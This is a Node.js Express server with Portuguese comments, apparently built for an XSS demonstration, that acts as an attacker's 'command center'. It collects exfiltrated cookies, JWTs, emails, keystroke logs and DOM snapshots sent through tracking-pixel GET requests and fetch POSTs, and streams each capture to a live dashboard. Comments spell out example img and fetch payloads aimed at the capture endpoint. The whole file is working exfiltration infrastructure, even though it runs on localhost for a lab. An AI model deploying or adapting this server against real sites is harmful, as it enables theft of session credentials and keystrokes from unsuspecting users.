'use strict';

const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = 4000;

// 1x1 GIF transparente para exfiltração via <img>
const TRANSPARENT_GIF = Buffer.from(
  'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
  'base64'
);

// CORS aberto: o payload XSS vem de outra origem (localhost:3000)
app.use(cors({ origin: '*', methods: ['GET', 'POST', 'DELETE'] }));
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));

// ── Estado em memória ──────────────────────────────────────────────────────
const captures = [];   // histórico de capturas
const sseClients = []; // clientes do dashboard conectados via SSE

// ── SSE: dashboard recebe atualizações em tempo real ──────────────────────
app.get('/events', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();

  // Envia estado atual ao conectar
  res.write(`event: init\ndata: ${JSON.stringify(captures)}\n\n`);

  sseClients.push(res);
  req.on('close', () => {
    const i = sseClients.indexOf(res);
    if (i !== -1) sseClients.splice(i, 1);
  });
});

function broadcast(event, data) {
  const msg = `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
  sseClients.forEach(c => c.write(msg));
}

// ── Helpers ────────────────────────────────────────────────────────────────
function buildEntry(source, fields) {
  return {
    id: `${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
    timestamp: new Date().toISOString(),
    ip: source.ip,
    userAgent: source.headers['user-agent'] || '',
    ...fields,
  };
}

function register(entry) {
  captures.unshift(entry);
  if (captures.length > 200) captures.length = 200; // limite de memória
  broadcast('capture', entry);
  console.log(`[CAPTURA] ${entry.type} | ${entry.ip} | ${entry.url || ''}`);
}

// ── Endpoint GET /capture — exfiltração via <img src> ─────────────────────
// Payload: <img src="http://localhost:4000/capture?type=cookie&data=DADOS&url=URL">
app.get('/capture', (req, res) => {
  register(buildEntry(req, {
    type:  req.query.type  || 'get',
    data:  req.query.data  || '',
    url:   req.query.url   || '',
    extra: req.query.extra || '',
  }));
  res.setHeader('Content-Type', 'image/gif');
  res.send(TRANSPARENT_GIF);
});

// ── Endpoint POST /capture — exfiltração via fetch() ──────────────────────
// Payload: fetch('http://localhost:4000/capture', {method:'POST', mode:'no-cors',
//   headers:{'Content-Type':'application/json'}, body: JSON.stringify({...})})
app.post('/capture', (req, res) => {
  register(buildEntry(req, {
    type:      req.body.type      || 'post',
    data:      req.body.data      || '',
    url:       req.body.url       || '',
    extra:     req.body.extra     || '',
    jwt:       req.body.jwt       || '',
    email:     req.body.email     || '',
    keylog:    req.body.keylog    || '',
    domSnap:   req.body.domSnap   || '',
  }));
  res.status(204).end();
});

// ── API REST ───────────────────────────────────────────────────────────────
app.get('/api/captures', (req, res) => res.json(captures));

app.delete('/api/captures', (req, res) => {
  captures.length = 0;
  broadcast('clear', {});
  res.status(204).end();
});

app.get('/api/stats', (req, res) => {
  const byType = captures.reduce((acc, c) => {
    acc[c.type] = (acc[c.type] || 0) + 1;
    return acc;
  }, {});
  res.json({ total: captures.length, byType, clients: sseClients.length });
});

// ── Start ──────────────────────────────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`
╔══════════════════════════════════════════╗
║       CENTRAL DE COMANDO — XSS Demo      ║
║   Dashboard → http://localhost:${PORT}      ║
║   Captura   → http://localhost:${PORT}/capture ║
╚══════════════════════════════════════════╝
  `);
});
